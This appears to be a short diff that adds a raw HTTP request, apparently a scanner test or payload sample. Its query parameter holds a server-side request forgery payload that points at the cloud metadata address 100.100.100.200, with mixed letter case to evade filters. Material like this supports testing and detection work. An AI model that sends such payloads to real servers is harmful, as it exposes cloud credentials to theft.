@@ -1,0 +1,4 @@
+GET /a?cmd=hTtP://100.100.100.200/lAtEsT/mEtA-dAtA/ HTTP/1.1
+Host: demo.example.com
+Connection: close
+
